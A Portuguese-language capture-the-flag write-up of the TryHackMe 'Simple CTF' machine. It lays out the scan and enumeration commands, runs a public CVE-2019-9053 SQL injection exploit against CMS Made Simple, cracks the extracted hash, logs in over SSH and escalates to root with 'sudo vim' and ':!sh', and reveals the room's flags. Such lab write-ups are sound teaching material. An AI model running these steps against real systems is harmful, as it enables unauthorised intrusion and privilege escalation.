# 🎯 Simple CTF — CTF Writeup
### TryHackMe | Boot-to-Root | Exfiltração via FTP Anônimo · SQL Injection (CVE-2019-9053) · Escalada de Privilégios via sudo vim

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 23/07/2026                                                                             |
| **Data do Pentest**   | 23/07/2026 · 09:10 – 13:48 (GMT-3)                                                     |
| **Alvo**              | `10.67.141.246` / `10.65.191.212` — TryHackMe · Simple CTF                             |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Nmap 7.99 · Gobuster 3.8.2 · SearchSploit · Exploit CVE-2019-9053 · OpenSSH · vim (GTFOBins) |
| **Plataforma**        | TryHackMe — Boot-to-Root                                                               |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo da máquina **Simple CTF** (TryHackMe), um host **Ubuntu Linux**, por meio de uma cadeia de ataque encadeando reconhecimento de rede, exfiltração de um arquivo de anotações via **FTP anônimo** contendo uma dica sobre reutilização de senha fraca, enumeração web que revelou uma instalação do **CMS Made Simple** vulnerável (**CVE-2019-9053** — SQL Injection não autenticada), exploração dessa vulnerabilidade para extração do hash e do salt da senha do administrador, quebra da senha, acesso inicial via SSH como o usuário `mitch` e escalada de privilégios explorando uma permissão **sudo mal configurada** para o binário `vim`. Nenhuma exploração de shellcode personalizado foi necessária — o comprometimento total dependeu de uma **vulnerabilidade de software conhecida (SQLi)** somada a **más práticas de gestão de senhas e configuração de sudoers**. As flags `user.txt` e `root.txt` foram capturadas com sucesso, confirmando o comprometimento total (root) do sistema.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta               | Versão  | Finalidade                                                                          |
|---------------------------|---------|--------------------------------------------------------------------------------------|
| **Nmap**                  | 7.99    | Varredura completa de portas e fingerprinting de serviços (`-A -sC -p-`)             |
| **Cliente FTP**           | -       | Enumeração e exfiltração de arquivo via login anônimo                                |
| **Gobuster**              | 3.8.2   | Enumeração de diretórios web (wordlist `common.txt`, extensões php/txt)              |
| **SearchSploit**          | -       | Localização de exploit público para `CVE-2019-9053` (CMS Made Simple)               |
| **Exploit CVE-2019-9053** | Python  | SQL Injection não autenticada — extração de credenciais do admin                     |
| **OpenSSH**               | client  | Acesso remoto à máquina alvo como usuário `mitch` (porta 2222)                        |
| **vim / GTFOBins**        | -       | Escalada de privilégios via `sudo NOPASSWD`                                          |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Varredura Nmap

> **09:10 GMT-3 · Nmap 7.99 · Alvo: 10.67.141.246**

**Comando:**
```bash
nmap -A -Pn -n -sC -T5 --min-rate 5000 --max-retries 1 -p- 10.67.141.246
```
![Nmap](/CTFs/Simple%20CTF/images/Scan_Nmap.png)

A varredura completa de portas revelou três serviços expostos:

```
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```

O FTP com **login anônimo habilitado** e o **SSH em porta não padrão (2222)** chamaram atenção imediata como possíveis vetores.

---

### FASE 2 — Enumeração FTP: Exfiltração de Anotação Interna

> **~09:20 GMT-3 · ftp 10.67.141.246**

![FTP](/CTFs/Simple%20CTF/images/Extrafilation_FTP.png)

Com o login anônimo confirmado, a conexão ao FTP localizou o diretório `pub/`, contendo o arquivo **`ForMitch.txt`**:

```bash
ftp> cd pub
ftp> ls
-rw-r--r-- 1 ftp ftp 166 Aug 17 2019 ForMitch.txt
ftp> get ForMitch.txt
```

**Conteúdo de ForMitch.txt:**
```
Dammit man... you're the worst dev i've seen. You set the same pass for
the system user, and the password is so weak... i cracked it in seconds.
Gosh... what a mess!
```

Uma pista direta de que a senha do sistema seria **fraca e reaproveitada** de outro local — provavelmente do banco de dados de uma aplicação web.

---

### FASE 3 — Enumeração Web: robots.txt e Gobuster

> **~09:25 GMT-3 · Browser + Gobuster 3.8.2**

O arquivo `robots.txt` encontrado era, na verdade, o **template padrão do serviço CUPS**, com duas entradas disallow: a raiz do site (`/`) e um caminho específico (`/openemr-5_0_1_3`) — este último uma **pista falsa** (red herring), já que nenhuma instalação do OpenEMR foi de fato localizada no servidor.

**Comando:**
```bash
gobuster dir -u http://10.67.141.246/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -x php,txt
```
![Gobuster](/CTFs/Simple%20CTF/images/Scan_Gobuster.png)

```
index.html   (Status: 200) [Size: 11321]
robots.txt   (Status: 200) [Size: 929]
simple       (Status: 301) [Size: 315] → http://10.67.141.246/simple/
```

O acesso a `http://10.67.141.246/simple/` revelou uma instalação completa do **CMS Made Simple**, incluindo uma postagem de notícia ("News module installed") assinada pelo usuário **`mitch`** — o mesmo nome implícito no arquivo `ForMitch.txt` exfiltrado do FTP.

![CMS](/CTFs/Simple%20CTF/images/Website.png)
> 🚩 **Username identificado (CMS/postagem): `mitch`**

---

### FASE 4 — Identificação da Vulnerabilidade: CVE-2019-9053

> **~09:40 GMT-3 · NVD + SearchSploit**

A pesquisa pela versão do CMS Made Simple identificada revelou a vulnerabilidade **CVE-2019-9053**: uma **SQL Injection cega, baseada em tempo (blind time-based)**, não autenticada, explorável através do módulo News via uma URL manipulada no parâmetro `m1_idlist`.

| Campo | Valor |
|-------|-------|
| CVSS Base Score | **8.1** (severidade HIGH) |
| Vetor | `CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Componente | CMS Made Simple 2.2.8 (módulo News) |

**Comandos:**
```bash
searchsploit CVE-2019-9053
searchsploit "CMS Made Simple"
searchsploit -m php/webapps/46635.py
```

![Exploit](/CTFs/Simple%20CTF/images/SearchExplot.png)

A busca direta pelo CVE não retornou resultados, porém a busca pelo nome do produto localizou o exploit correspondente: **`CMS Made Simple < 2.2.10 - SQL Injection`** (`php/webapps/46635.py`), copiado para o diretório local para uso na exploração.

---

### FASE 5 — Exploração: SQL Injection e Extração de Credenciais

> **~09:50 GMT-3 · python3 46635.py**

A execução do exploit contra a aplicação web extraiu, diretamente do banco de dados via injeção SQL cega, as credenciais do administrador do CMS:

```
[+] Salt for password found: 1t
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```
![Exploit Run](/CTFs/Simple%20CTF/images/Pass_and_Email.png)
> 🚩 **Credenciais extraídas (SQLi): `email: admin@admin.com` | `hash: 0c01f4468bd75d7a84c7eb73846e8d96` | `salt: 1t`**

---

### FASE 6 — Quebra de Senha e Acesso Inicial: SSH + user.txt

> **~09:55 GMT-3 · ssh mitch@10.65.191.212 -p 2222**

Com o hash e o salt em mãos, a senha foi quebrada com sucesso, confirmando exatamente a dica deixada em `ForMitch.txt`: uma senha fraca e reutilizada — **`secret`**. Como o mesmo usuário `mitch` expunha o serviço SSH na porta 2222, a mesma credencial foi testada diretamente:

```bash
ssh mitch@10.65.191.212 -p 2222
```

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
```
![SSH and User Flag](/CTFs/Simple%20CTF/images/User_flag.png)
> 🚩 **user.txt — FLAG CAPTURADA: `G00d j0b, keep up!`**

---

### FASE 7 — Escalada de Privilégios: sudo vim + Captura de root.txt

> **~10:00 GMT-3 · sudo -l + GTFOBins (vim)**

O comando `sudo -l` revelou a configuração insegura de sudo:

```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```
![Privilege Escalation](/CTFs/Simple%20CTF/images/Privilege_Escalation.png)
O usuário `mitch` podia executar o **`vim`** como root, **sem senha**. Consultando o GTFOBins, o vim permite a abertura de um shell interativo com privilégios herdados do processo que o invocou:

```bash
$ sudo vim
:!sh

# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it!
```

![Root Flag](/CTFs/Simple%20CTF/images/Root_Flag.png)
> 🚩 **root.txt — FLAG CAPTURADA: `W3ll d0n3. You made it!`**

---

## ⛓ Linha do Tempo do Comprometimento

```
[09:10 GMT-3] FASE 1 — RECONHECIMENTO (Nmap 7.99)
    Scan -A -sC -p- sobre 10.67.141.246
    Portas: 21/FTP (anônimo) · 80/HTTP (robots.txt) · 2222/SSH
    ↓
[09:20 GMT-3] FASE 2 — ENUMERAÇÃO FTP
    ftp anonymous → pub/ForMitch.txt
    Dica: senha fraca e reutilizada para o usuário do sistema
    ↓
[09:25 GMT-3] FASE 3 — ENUMERAÇÃO WEB
    robots.txt (template CUPS) → /openemr-5_0_1_3 (pista falsa)
    Gobuster → /simple/ → CMS Made Simple (autor: mitch)
    ↓
[09:40 GMT-3] FASE 4 — IDENTIFICAÇÃO DA VULNERABILIDADE
    CVE-2019-9053 — SQLi não autenticada (CVSS 8.1 HIGH)
    searchsploit "CMS Made Simple" → 46635.py
    ↓
[09:50 GMT-3] FASE 5 — EXPLORAÇÃO (SQL Injection)
    python3 46635.py → salt, username, email, hash extraídos
    ↓
[09:55 GMT-3] FASE 6 — ACESSO INICIAL (SSH)
    Hash quebrado → senha: secret
    ssh mitch@10.65.191.212 -p 2222
    FLAG user.txt: G00d j0b, keep up! ✓
    ↓
[10:00 GMT-3] FASE 7 — ESCALADA DE PRIVILÉGIOS (sudo vim)
    sudo -l → (root) NOPASSWD: /usr/bin/vim
    sudo vim → :!sh → whoami: root
    FLAG root.txt: W3ll d0n3. You made it! ✓
    ↓
[10:00 GMT-3] COMPROMETIMENTO TOTAL — root@Machine
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Nmap 7.99 (`-A -sC -p-`) | FTP anônimo, Apache/robots.txt e SSH (2222) |
| Enumeração FTP | Cliente FTP (anonymous) | `ForMitch.txt`: dica de senha fraca reutilizada |
| Enumeração Web | robots.txt + Gobuster | `/simple/` → CMS Made Simple (autor `mitch`) |
| Identificação de Vulnerabilidade | NVD + SearchSploit | `CVE-2019-9053` — SQLi não autenticada |
| Exploração | Exploit `46635.py` | Hash, salt e e-mail do admin extraídos |
| Acesso Inicial | SSH (`mitch:secret`) | `user.txt` capturado |
| Escalada de Privilégio | `sudo` + GTFOBins (`vim`) | `(root) NOPASSWD: /usr/bin/vim` → shell root |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.67.141.246` / `10.65.191.212` | Máquina Simple CTF (TryHackMe) — Ubuntu 16.04.6 LTS |
| Serviços expostos | `21/TCP` (vsftpd, anônimo) · `80/TCP` (Apache 2.4.18) · `2222/TCP` (OpenSSH 7.2p2) | Superfície de ataque inicial |
| Arquivo exfiltrado | `pub/ForMitch.txt` | Revela reuso de senha fraca para o usuário do sistema |
| Aplicação vulnerável | CMS Made Simple 2.2.8 (`/simple/`) | Autor da postagem: `mitch` |
| Vulnerabilidade | `CVE-2019-9053` | SQLi cega via parâmetro `m1_idlist` do módulo News; CVSS 8.1 |
| Exploit utilizado | `php/webapps/46635.py` | CMS Made Simple < 2.2.10 - SQL Injection |
| Credenciais extraídas | `admin@admin.com` / hash `0c01f4468bd75d7a84c7eb73846e8d96` / salt `1t` | Extraídas via SQLi |
| Credencial comprometida | `mitch : secret` | Hash quebrado; reutilizada no SSH |
| Configuração sudo insegura | `(root) NOPASSWD: /usr/bin/vim` | Permite escalada via GTFOBins (`:!sh`) |
| Flag user | `G00d j0b, keep up!` | `~/user.txt` |
| Flag root | `W3ll d0n3. You made it!` | `/root/root.txt` |
| Técnica (MITRE ATT&CK) | `T1190` | Exploit Public-Facing Application |
| Técnica (MITRE ATT&CK) | `T1552.001` | Unsecured Credentials: Credentials In Files |
| Técnica (MITRE ATT&CK) | `T1548.003` | Abuse Elevation Control: Sudo and Sudo Caching |

---

## ✅ Resumo das Flags

| # | Flag | Valor |
|---|------|-------|
| 🚩 user.txt | `~/user.txt` | `G00d j0b, keep up!` |
| 🚩 root.txt | `/root/root.txt` | `W3ll d0n3. You made it!` |

---

## 📚 Referências

- [TryHackMe — Simple CTF](https://tryhackme.com/room/easyctf)
- [NVD — CVE-2019-9053](https://nvd.nist.gov/vuln/detail/CVE-2019-9053)
- [Exploit-DB — CMS Made Simple < 2.2.10 SQL Injection](https://www.exploit-db.com/exploits/46635)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/)
- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK T1552.001 — Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
- [MITRE ATT&CK T1548.003 — Abuse Elevation Control: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/)

---